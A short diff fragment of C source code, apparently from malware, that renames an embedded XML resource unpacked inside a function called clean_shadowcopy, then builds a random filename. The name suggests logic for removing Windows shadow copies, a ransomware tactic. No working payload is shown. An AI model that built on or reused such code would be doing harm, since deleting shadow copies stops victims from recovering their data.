@@ -453,7 +453,7 @@ void * tp_pfr_free_func(void *arg)
 void clean_shadowcopy(void)
 {
 	size_t size = 0;
-	const char *data = mg_unpack("/./Sources/embed/CSDCP.xml", &size, NULL);
+	const char *data = mg_unpack("/./Sources/embed/sadcpy.xml", &size, NULL);
 	
 	char* fname = generateRandomString(randInRange(4, 10));
 	char *cwd = get_cwd();
